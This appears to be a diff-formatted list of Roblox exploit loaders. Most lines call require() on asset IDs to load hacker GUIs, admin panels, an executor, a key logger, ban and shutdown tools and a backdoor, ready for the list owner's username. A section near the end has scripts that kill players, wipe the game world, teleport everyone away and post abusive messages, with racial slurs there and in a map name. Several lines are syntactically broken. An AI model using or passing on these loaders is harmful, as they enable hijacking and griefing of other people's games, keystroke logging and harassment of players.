+‏require(5146396793).load("urnamehere") - GodSpawn GUI
+
+‏require(5344766102).fare("urnamehere") - Fareâ€™s Hubhub
+
+‏require(6097532439):redlightsdontleak("urnamehere") - Redlights.exe
+
+‏require(6099373575).load("u
+
+require(75885601008770)("aleruo99")
+
+require(0x408e54f7c).ServerSideV101FirstVersion("aleruo99")
+
+require(121472107779604):Matz("aleruo99")
+
+require(127445614272366).op("aleruo99")
+
+
+require(113825094179678).pepsi("shatovrail25")
+
+require(127445614272366).op("aleruo99")
+
+require(17131051292).DariusSiSupramSkid('aleruo8')
+
+require(99819848269749).v666("aleruo8")
+
+require(75885601008770)("aleruo8")
+
+require(0x615f4c122269)("aleruo8")
+
+require(4875169740).load("aleruo8")
+
+require(13772265165).TeamFatGUICrackedByLua("aleruo8")
+
+require(0x7e9a8d32c580).v2("aleruo8")
+
+require(15232587754).DreamGUI("aleruo8")
+
+require(124950649033109).anticheat("aleruo8")
+
+require(6534274227)("XDpro25216")
+
+require (74349243416068): Hload("asder10065")
+
+require(0x4580ffa50).funny("asder10065")
+
+require(99457956933204).Trollv1("asder10065")
+
+require(0x6F40A61A92BA).mango("asder10065")
+
+require(0x700D8AF02BCF).anticheat("ps5fan333ALT")
+
+require(10027382472)("Project ligma")
+
+require(7605492967).Military("YourNameHere")
+
+require(4943481014).Nightmare("YourNameHere")
+
+require(12180555239).rooms("YourNameHere")
+
+require(123255432303221):Pload("Mike_346106/Overlords_alty")
+
+require(16920033857)("USERNAME")
+ require(13029149666).ilovewarhead("username")  [V1.1]
+
+require(13029149666).ilovewarhead("username") - v1.1
+require(13023620184).ilovewarhead("username") - v1
+
+require(15629007042)("MURILL1808")
+
+require(12070820190).fnaf1()
+
+require(12305686657).gunui("user")
+
+require(9896417368).load("username") 'private' executor
+require(12152005848)("username") project ligma
+require(11988216523).load("username") zetra79
+require(12491997136)("fluxusguy1234") rc7
+require(13641624112):tus("username") sugma / stigma edit
+require(13326771513).TUBERSGUI("username") tubers93 gui
+require(11940052675).load("username") k00padmin
+require(10028265342)("username") anonymous gui
+require(11983144110)("username") edited bytegui
+require(12897516284):pls("username") verified exser edit
+require(13718034160):pls("LuaGunsX") ANOTHER ONE
+require(11504840911).load("username") display hub
+require(11721506491)("username") adren gui
+require(9036221508).load("username") c00lgui edit v2
+require(9497518303).BYTEGUIKYXLES("username") another bytegui edit ig?
+require(11611459969).load("username") k00pgui revamp
+require(13021554242).Cl00vin("username") secret hub
+require(13045816634)("username") c00lboi admin
+require(13464268783).k00pzbackdoor("username") backdoor k00pgui
+require(16528756174).epic("this gui is working")Dragostar v5 require(0x391c103dd).load("user")
+require(9812006079):Immortal("user")
+require(13944915491).item_asylum("user")
+require(15622251265).ttkdd("user")
+require(0x398524b58).w("user")
+
+require(4832971989)("puturcockynamehere")
+
+require(10791446752).s400("YourNameHere")
+
+require(4207271766).load("pfzq")
+
+Polaria - require(123255432303221):Pload("user")
+Secret Service Panel - require(17073274775)("pfzq")
+Secret Service Panel DEX Version - require(16977144399)("pfzq")
+Secret Service Administration - require(16668858335).skid("pfzq","ssa")
+Old Secret Service Administration - require(16668984909).load("pfzq","1994 days on roblox")
+Old Secret Service Panel - require(17632411730){Owners={"pfzq"},Prefix=';'}
+Obunga -require(97971729290214)()
+Obuga Citizen One - require(123134147078298)()
+DreamyBull Gui , By Hamad - require(18790530478)("pfzq")
+infinitie yield - require(7634392335)("pfzq")
+Fbi executor - require(18178393297)("pfzq")
+SS v2 So Cool - require(6405516751).load("RobloxBoy4762") 
+primadon - require(17513697824)("Username")
+AOS Admin - require(16661955141):Fire("pfzq")
+ur bads AOS Admin - require(16771067578):Fire("pfzq")
+Mr Bean admin - require(16638501761){Owners={"pfzq"},Prefix=';'}
+Mcdonalds Admin - require(16668583391){Owners={"pfzq"},Prefix=';'}
+Strato admin - require(6590963180).load("pfzq")
+V3rmillion Admin - require(16991153209).load("pfzq")
+MML Admin -  require(7573703059).MMLHax("pfzq")
+Fe hax - require(17472456139).fehax("yourname")
+Nexus Admin - require(16988699893)("pfzq")
+Bee Exoliner admin V2 - require(2969225161):Fire("Nob","pfzq")
+Intent Admin - require(16988255787):Fire("Intent","pfzq")
+Frank's Admin - require(16988244323):FranksAdmin("Frank","pfzq")
+Infyield Admin - require(4832971989)("RobloxBoy4762")
+Moon's Infyield Admin - require(16988709094)("pfzq")
+Cooks Infyield Admin - require(16662939551)("pfzq")
+Adonis Admin - require(16662768931):GetAdmin("pfzq","Hi??")
+Quantom Admin - require(3048207279):Fire("kermitwashere,ok","pfzq")
+Rocky2U Admin - require(16662837893).AddRocky("pfzq")
+
+require(6929171488).loadMap("mango")
+require(7569443962).setup("mango")
+require(6675792322).sfoth("mango") 
+require(3168737443).load("mango")
+require(6599453106).load("mango")
+require(16991266419)("mango")
+require(17110662847).asd("mango")
+require(17110631120).asd("mango")
+require(17110658137).asd("mango")
+require(17110637363).asd("mango")
+require(16662863386).kfc("mango")
+require(16662858613).load("mango")
+require(16662877421).panini("mango")
+require(4781260949)("mango")
+require(16668889289).asd("mango")
+require(16668546367).asd("mango")
+require(17110655911).asd("mango")
+require(16668637411).asd("mango")
+require(12653566767).load("mango")
+require(17110698446).asd("mango")
+require(16668880727).load("mango")
+require(16668899769).load("mango")
+require(16668946128).asd("mango") 
+require(17102919719).map("mango")
+require(17871796694).map()
+require(17825574180).map()
+
+Secret Service Panel - require(17073274775)("pfzq")
+Secret Service Panel DEX Version - require(16977144399)("pfzq")
+Secret Service Administration - require(16668858335).skid("pfzq","ssa")
+Old Secret Service Administration - require(16668984909).load("pfzq","1994 days on
+roblox")
+Old Secret Service Panel - require(17632411730){Owners={"pfzq"},Prefix=';'}
+Obunga -require(97971729290214)()
+Obuga Citizen One - require(123134147078298)()
+DreamyBull Gui , By Hamad - require(18790530478)("pfzq")
+infinitie yield - require(7634392335)("pfzq")
+Fbi executor - require(18178393297)("pfzq")
+SS v2 So Cool - require(6405516751).load("RobloxBoy4762")
+primadon - require(17513697824)("Username")
+AOS Admin - require(16661955141):Fire("pfzq")
+ur bads AOS Admin - require(16771067578):Fire("pfzq")
+Mr Bean admin - require(16638501761){Owners={"pfzq"},Prefix=';'}
+Mcdonalds Admin - require(16668583391){Owners={"pfzq"},Prefix=';'}
+Strato admin - require(6590963180).load("pfzq")
+V3rmillion Admin - require(16991153209).load("pfzq")
+MML Admin - require(7573703059).MMLHax("pfzq")
+Fe hax - require(17472456139).fehax("yourname")
+Nexus Admin - require(16988699893)("pfzq")
+Bee Exoliner admin V2 - require(2969225161):Fire("Nob","pfzq")
+Intent Admin - require(16988255787):Fire("Intent","pfzq")
+Frank's Admin - require(16988244323):FranksAdmin("Frank","pfzq")
+Infyield Admin - require(4832971989)("RobloxBoy4762")
+Moon's Infyield Admin - require(16988709094)("pfzq")
+Cooks Infyield Admin - require(16662939551)("pfzq")
+Adonis Admin - require(16662768931):GetAdmin("pfzq","Hi??")
+Quantom Admin - require(3048207279):Fire("kermitwashere,ok","pfzq")
+Rocky2U Admin - require(16662837893).AddRocky("pfzq")
+Bilbert SS - require(16988766924)("pfzq")
+Loaf Ss - require(6405516751).load("pfzq")
+Doot Ss - require(16662883722).hii("pfzq")
+Sigma Ss - require(4982992957):Fire("pfzq")
+Herobrine - require(17601661042)("pfzq")
+NI-CISYNIA - require(7324976391).load("pfzq")
+Cloud - require(5665978099)("pfzq")
+Morph Magic GUI - require(4941950065)("pfzq")
+Sugma V1 GUI - require(16669178176)("pfzq")
+Manuall Hax GUI - require(6712240276).yo("pfzq")
+Gosh GUI - require(16668835270).load("pfzq")
+PLUR GUI - require(6280142988).Purl("pfzq")
+Ark Of Hades GUI - require(16988738909)("pfzq")
+Rocket GUI - require(2513295250).load("pfzq")
+SS GUI - require(2937437253).load("pfzq")
+UVG GUI - require(6280136701).load("pfzq")
+JuanaV3 GUI - require(4924065675):Fire("pfzq")
+C00lKidd GUI - require(16991244705):Fire("pfzq","c00lkidd")
+Bee's SS GUI - require(2670071430).load("pfzq")
+Dex ultimate Debugging Suite - require(16662779782)("pfzq")
+Classic GUI - require(2930633918).load("pfzq")
+Nilzer V5 GUI - require(7054827484).load("pfzq")
+Utgv1 Abusive guns GUI - require(6447503730)("pfzq")
+Gun GUI - require(16662820067)("pfzq","BEANMANBEANMAN")
+Tubers93 Gun GUI - require(6677765693)("pfzq","welovedooter")
+Stummy and Watheck Gun GUI - require(16662919029)("pfzq","how")
+best hub- require(4634558715)("pfzq")
+BuilderX Hub - require(16668530286).BX("pfzq")
+Topkek V5.2 - require(10127180199)("pfzq")
+Topkek V5 - require(6449959779)("pfzq")
+Topkek V4 - require(4253460888).die("pfzq")
+Dex - require(2701572481):Fire("pfzq")
+Developer Console 2.0- require(16668841976).load("pfzq")
+Bee's Dex - require(2919395703).load("pfzq")
+Chathax - require(2942451291):Yee("pfzq")
+Project ligma 2 - require(6595545318)(pfzq")
+Key Logger - require(7098251271)("pfzq")
+hark V2 - require(4770241281):hark("pfzq")
+Hat remover - require(3052589161).load("pfzq")
+Ro Exploit v6 - require(4159766103).load("pfzq")
+Ro-Exploit v7 - require(6822778802)("pfzq")
+Launcher - require(4878995989)("pfzq")
+Noot-Noot- require(2113801730).load("pfzq")
+Chat Bypass - require(16991207514)()
+Love Communism - require(881919150)()
+Script Logger - require(5098133040):FirePire("pfzq:Pire")
+Chat GUI - require(16662775615)("pfzq")
+Ban Remote - require(6244072289).load("pfzq")
+Jumpscare: require(17107085030).jumpscare("Players name here")
+Teletubbies Jumpscare: require(17118822859).gui()
+Jeff the Kiler Jumpscare: require(17118930276).gui()
+Antiban - require(2788315378).load("pfzq")
+new project stigma watermark: require(16662947197).lol("pfzq")
+Crossmod Ya - require(4294379983)("pfzq")
+Shutdown - require(2982093974):Shutdown()
+Kohls Rank Owner - _G.setPower -Fire("pfzq", 6)
+Nepaha - require(4942359996):nepaha(5127063380,1,3)
+hark stamper - require(13214021276).stamper(game -
+GetService("Players").LocalPlayer)
+tool stamper - require(17015419876)("pfzq")
+Stamper tool 2 - require(17107064578)("pfzq")
+Converted Btools - require(16530393933)("pfzq")
+---
+MODULES
+—
+Teddy Trap - require(6291736680)("pfzq")
+Whispy Woods - require(17072075353)("pfzq")
+WTRB - require(17073309179).asd()
+Devoyance V4 - require(17015453713)("pfzq")
+Star Glitcher: require(17110304506):Fire("pfzq")
+Knife Murderer - require(17000621196)("pfzq")
+VR Hands V2 - require(16991174162).LoadHands("pfzq")
+VR Hands - require(16991188827).LoadHands("pfzq")
+bus - require(16494104046)("pfzq")
+old bus - require(4302281183)("pfzq")
+steve - require(16756009191).mc("pfzq")
+Arc of mystics - require(16571960080)("pfzq")
+bulldozer - require(16571914488)("pfzq")
+Primadon - require(15851028325)("pfzq")
+Grandosla - require(16492539574)("pfzq")
+Trainset- require(15708038439)("pfzq")
+Dimensiona Glitcher - require(6058166660)("pfzq")
+Boat - require(4118900723)("pfzq")
+Catholic Mario - require(2936927437).load("pfzq")
+Asgpro - require(7861620568).load("pfzq")
+Mustard Gas - require(16668612817).load("pfzq")
+Camera Chat Viewer - require(16668701301)("pfzq")
+SCP 173 - require(17234454946).load("pfzq")
+Venti - require(16991146409)("pfzq")
+dong - require(16662786555).load("pfzq")
+Rufus FB Beryl Gun - require(7632927778).Gunnis("pfzq")
+Remington 870- require(4879817593)("pfzq")
+Baby Thrower - require(16991251417)("pfzq")
+Big tornado - require(2938226981).load("pfzq")
+Money Bags - require(8712553243).load("pfzq")
+DOGE Summoner - require(16662812199).fehack("pfzq")
+Hark Guns - require(6930300577)("pfzq")
+Mr Bean Decals - require(16668594829).map()
+Snake - require(10504523281)("pfzq")
+Mario Decals - require(16991126811)("pfzq")
+Flamethrower - require(9306185951).load("pfzq")
+Koolaid Sizer - require(7695034125).load("Koolaid", "pfzq")
+RockNRoll - require(9306045365).load()
+CSGO Guns - require(4207271766).load("pfzq")
+Dababy mobile - require(6604157329).dababymobile("pfzq")
+Jihad: require(2971552917).load("pfzq")
+Guns - require(2823974237).giveGuns('pfzq')
+Other Guns - require(16668739839).load("pfzq")
+Volcanic Inc Guns - require(16668929184).load("pfzq","asd")
+Red imposter - require(9307026189).load("pfzq")
+Drip goku - require(6331324671).load("pfzq")
+dream - require(6590634930).load("pfzq")
+Pee - require(4709753802).load("pfzq")
+AR-15 - require(16662828437).naenae("pfzq")
+dong - require(2979543081).load('Dong', 'pfzq')
+Catalog Items - require(16668556009).items("pfzq")
+R6 - require(9635947635).load("pfzq")
+Stummy's R6 - require(16669109277):albert("pfzq")
+Worship - require(9423212339).lol()
+Grab Knife V1 - require(16662794620):Fire("pfzq","knife")
+Grab Knife V2 - require(16662799266):Fire("pfzq","knife")
+Grab Knife V3 - require(2699238418):Fire("pfzq")
+Grab Knife V4 - require(16662802057).load("pfzq")
+Dev Uzi - require(16662808456):Fire("pfzq","dev-uzi")
+Bird Wings - require(16668712615):Fire("pfzq","birdwings")
+F3X - require(16662897769).load("pfzq")
+SubStrike - require(14775634069)("pfzq")
+Holiday Feel - require(4502358827).load("pfzq")
+ASG Glitcher - require(4721760220):yes("pfzq")
+Auerus Sword: require(5428886940)('pfzq')
+lightborn - require(16639115097)("pfzq")
+S400 Missile Airstrike - require(10791446752).s400("pfzq")
+RC7 Cloud - require(16668626906).load("pfzq")
+Nightmare - require(5540630099).load("Night", "pfzq")
+Some nigga flying - require(9353485888).smokio("pfzq")
+Agent Gears - require(16668718607):Start("pfzq","AAA")
+Nuclear Missile - require(7804327506).amigodogodenot123("pfzq")
+QuadDoom - require(5987029970)("Quad", "pfzq")
+Mech Helkren - require(5987029970)("mechv3", "pfzq")
+sledgehammer - require(8038037940).CLoad("pfzq")
+Random Sniper - require(6141052467).load("pfzq")
+Reaper Apocalypse Gun - require(9439511627).load("pfzq")
+Hark - require(16661967932).load()
+Mareno - require(5617162803)("mareno", "pfzq")
+Sonic - require(16668806562).you("pfzq")
+Xester - require(2918747265).load("pfzq")
+Guitar Vizualiser - require(6494016015).ez("pfzq")
+Electric Gun - require(6494159046).load("pfzq")
+Star Glitcher 1.0 - require(9442292486).load("pfzq")
+Star Glitcher 2.0 - require(4749896781).no("pfzq")
+Project Reaper - require(6494001763).load("pfzq")
+Virus - require(16661962908).load("pfzq")
+Internal War - require(9359921623).load("pfzq")
+Infection Virus - require(8317917339).Infection("pfzq")
+Tesseract- require(4611972434).load("pfzq")
+Dual Ultima - require(9439014627).load("pfzq")
+Jarred Ultra Mech - require(9408190487).load("pfzq")
+Orb titan - require(9438952843).load("pfzq")
+Sociopath - require(4611999946).load("pfzq")
+SpiderMan With Gun - require(5044313504).load("pfzq")
+Shotgun - require(6230507140).load("pfzq")
+Neurotic - require(5617600468).load("pfzq")
+Charlie Chaptin - require(6606289064).load("pfzq")
+Gattai Zamasu - require(6424791174).load("pfzq")
+SHINI-G4-MI - require(4661785318).load("pfzq")
+Vereus - require(4875169740).load("pfzq")
+Goku - require(7433042949)("pfzq")
+USSR Helicopter - require(5861768566).import()
+Kill Machine - require(6375409514).load("pfzq")
+TeaPot- require(5982007129).load("pfzq")
+Dark Wings - require(9439278540).load("pfzq")
+Music Box - require(0x1111c26b0)['eliza']('pfzq');
+Goner - require(4513235536).G("pfzq")
+Swords - require(6215755057).load("pfzq")
+rocket sword of old - require(6496754050).load("pfzq")
+Shaluster - require(6494107376).load("pfzq")
+Bacon hair Army - require(9439056539).load("pfzq")
+You are an idiot - require(8222129769).youareanidiot("pfzq")
+Wasp Fighter Jet - require(5860060462).load("pfzq")
+Ultimate titan - require(6494164528).load("pfzq")
+john Doe - require(2845929020).ooga("pfzq")
+Neko - require(6029387696).neko("pfzq")
+Hacker X - require(5641200549).load("pfzq")
+Omni God - require(6494181104).load("pfzq")
+Patrick - require(6494144008).load("pfzq")
+Hammer - require(6494024548).load("pfzq")
+Binary Great Sword: require(9711836572).load("pfzq")
+Lua Hammer - require(9439267918).load("pfzq")
+Jojo Bizzare - require(6494123768).load("pfzq")
+Cop - require(9439217371).load("pfzq")
+Star Glitcher spectrum - require(2930987220).load('pfzq')
+Hello Kitty MrbyeBye - require(4977641125).mbye("pfzq")
+Viridis Super Strong Armor - require(9711843894).load("pfzq")
+memes animations - require(2860424822)("pfzq","memes")
+Koolaid Man - require(2923173766):Kermit('pfzq',game.JobId)
+Kb - require(7107797840).load("pfzq")
+Red Claw - require(9439285251).load("pfzq")
+The Alchemist - require(6224178099).load("pfzq")
+Hand Monster - require(9439307767).load("pfzq")
+Memento MorI - require(7266243611).eliza("pfzq")
+Super Strong Laser Mech - require(9711849049).load("pfzq")
+Shrike - require(6329652196):run("pfzq","shrike")
+Giant Noob head - require(6269838898).load()
+Thanos Gauntlet- require(9439076702).load("pfzq")
+Bleach - require(16668687217).load("pfzq")
+Olisauce Remote Control - require(9439040673).load("pfzq")
+Flying Ship - require(6842540352).load("pfzq")
+Cyclops Preech - require(9344514982).load("pfzq")
+Cyclops Creep - require(9439416444).load("pfzq")
+Brutal Overlord: require(5599450138).load("pfzq")
+Neptunian V - require(4453491513).load("pfzq")
+Atlas Axe - require(6438361301).load("pfzq")
+Blue Puncher - require(9359664666).load("pfzq")
+Master of Stars - require(6494239587).load("pfzq")
+cool glitcher - require(5732682168).fehack("pfzq")
+Omega Sword - require(6496599157).load("pfzq")
+Dual pink guns - require(9439237199).load("pfzq")
+Gunjourer - require(9344120548).load("pfzq")
+Ice Cream Sword - require(9439203970).load("pfzq")
+Shotgun - require(3956835082).load("pfzq")
+Airplane Falling - require(6493987727).load("pfzq")
+Mini rocket - require(6494007732).load("pfzq")
+bug: require(4977634471):bruh("pfzq")
+Aureola - require(5732671544).fehack("pfzq")
+Flash - require(6493968882).load("pfzq")
+Mech helkrenV2 - require(5987029970)("mechHV2", "pfzq")
+Felipe - require(5933208733).load("pfzq")
+bleach - require(6494149576).load("pfzq")
+Seven Stars - require(6496771297).load("pfzq")
+nuke - require(6494102851).load("pfzq")
+Helikopter - require(6494111815).load("pfzq")
+Cleetus - require(5464614479).load("pfzq")
+Ban Hanner - require(6494024548).load("pfzq")
+Chainsaw - require(6494138236).load("pfzq")
+Physco Knife - require(6494130175).load("pfzq")
+Thanos - require(6030031466).Load("pfzq")
+---
+SCRIPTS
+---
+printidentify()
+warn('hi')
+print('hi')
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+local player = "name here"
+local character = game.Players[player].Character
+if character then
+ character:BreakJoints()
+end
+game.Players.LocalPlayer.Character:BreakJoints()
+workspace:ClearAllChildren()
+local player = "name here"
+game.Players[player].Character.Humanoid.Health = 0
+local plr = game.Players.LocalPlayer
+local character = plr.Character or plr.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild('HumanoidRootPart')
+local ws = 500
+local function spin()
+ while true do
+ humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0,
+math.rad(ws), 0)
+ wait(0.1)
+ end
+end
+spin()
+a = function() end
+print(a)
+game.Chat:Chat(game.Players.LocalPlayer.Character.Head, 'say anything here')
+game.Players.LocalPlayer.PlayerGui['NameUI'..game.Players.LocalPlayer.Name]:Remove(
+)
+game.Workspace.Gravity = 0
+Humanoid.RigType = Enum.HumanoidRigType.r6
+local a = Instance.new('Message')
+a.Text = 'go fuck yourself'
+a.Parent = workspace
+wait(3)
+a:Destroy()
+local a = Instance.new('Message')
+a.Text = 'ambatukam'
+a.Parent = workspace
+wait(4)
+a.Text = 'Nigger93 World Tour'
+Wait(5)
+a:Destroy()
+wait('2')
+local gameId =
+for i, Player in pairs(game.Players -GetPlayers()) do
+ if Player:IsA('Player') then
+ game:GetService('TeleportService'):Teleport(gameId, Player)
+ end
+end
+local plr = game:GetService('Players'):FindFirstChild('Username')
+if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+ local Main =
+game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
+ local morph = game.Players:CreateHumanoidModelFromDescription(Main,
+Enum.HumanoidRigType.R6)
+ morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)
+ morph.Name = plr.Name
+ plr.Character = morph
+ morph.Parent = workspace
+end
+---
+MAPS
+---
+2006 map - require(6929171488).loadMap()
+Buddha Map - require(4704979605).lol()
+Blames Map - require(6418886263).kfc()
+2076 Town - require(7569443962).setup()
+Sword Brickbattle VII - require(6675792322).sfoth()
+Mcdonalds - require(3168737443).load()
+Dance Devils Mom Roleplay - require(6599453106).load()
+Forest - require(16991266419)()
+Frappe - require(17110662847).asd()
+Palace - require(17110631120).asd()
+Sex - require(17110649161).asd()
+Roblox HQ - require(17110658137).asd()
+Arc Mage - require(17110637363).asd()
+KFC - require(16662863386).kfc()
+Indian Scam Center - require(16662858613).load("RobloxBoy4762")
+Lil Nas X Concert - require(16662877421).panini()
+Waterpark - require(4781260949)()
+City Life - require(16668889289).asd()
+Burger King - require(16668546367).asd()
+Walmart: require(17110655911).asd()
+Spongebob - require(16668637411).asd()
+Zombie Apacolaypse - require(12653566767).load("RobloxBoy4762")
+XXXTentacion - require(17110698446).asd()
+770- require(16668880727).load()
+Target - require(16668899769).load("RobloxBoy4762")
+Arena - require(16668946128).asd()
